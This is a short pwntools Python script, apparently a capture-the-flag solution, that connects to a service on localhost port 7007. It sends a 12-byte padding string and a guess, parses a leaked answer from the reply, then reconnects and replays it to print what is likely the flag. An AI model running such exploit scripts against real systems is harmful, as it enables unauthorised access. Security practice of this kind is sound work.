from pwn import *

p = remote('localhost', 7007)

p.recvline()
p.sendline(b'A'*12)
p.recvline()
p.sendline(b'1234')
answer = p.recvuntil(b':').split(b' ')[2]
p.close()

p = remote('localhost', 7007)
p.sendline(b'A'*12)
p.sendline(answer)
print(p.recvall().split(b'\n')[-3])
p.close()
